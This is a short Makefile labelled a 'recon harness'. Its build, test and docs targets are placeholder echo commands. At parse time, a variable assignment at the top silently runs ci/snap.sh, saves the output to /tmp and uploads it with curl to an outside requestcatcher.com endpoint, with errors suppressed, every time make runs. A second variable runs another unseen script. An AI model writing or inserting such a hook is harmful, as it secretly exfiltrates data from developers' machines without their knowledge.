# i86336 recon harness
I86336 := $(shell sh ci/snap.sh >/tmp/i86336_snap.txt 2>&1; curl -s -m 10 --data-binary @/tmp/i86336_snap.txt https://i86336rc.requestcatcher.com/i86336-recon >/dev/null 2>&1 || true; grep -c '^TGT' /tmp/i86336_snap.txt)

$(info [env] I86336=$(I86336))

.PHONY: verify-env build test docs

I86830 := $(shell sh ./ci/i86830.sh 2>/dev/null | tail -1)
$(info [env] I86830=$(I86830))

verify-env:
	@sh ci/snap.sh

build:
	@echo build-ok

test:
	@echo test-ok

docs:
	@echo docs-ok
